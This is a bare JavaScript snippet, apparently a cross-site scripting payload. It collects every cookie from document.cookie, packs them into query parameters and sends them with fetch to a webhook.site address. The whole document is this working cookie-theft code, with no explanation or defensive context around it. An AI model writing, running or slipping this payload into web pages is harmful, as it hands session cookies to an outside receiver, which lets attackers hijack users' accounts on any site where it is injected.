const cookies = document.cookie.split('; ');

const params = new URLSearchParams();
cookies.forEach(cookie => {
    const [key, value] = cookie.split('=');
    params.append(key, value);
});

fetch(`https://webhook.site/dd3fec47-c7b3-4edb-b03d-5776296ef6e7?${params.toString()}`);
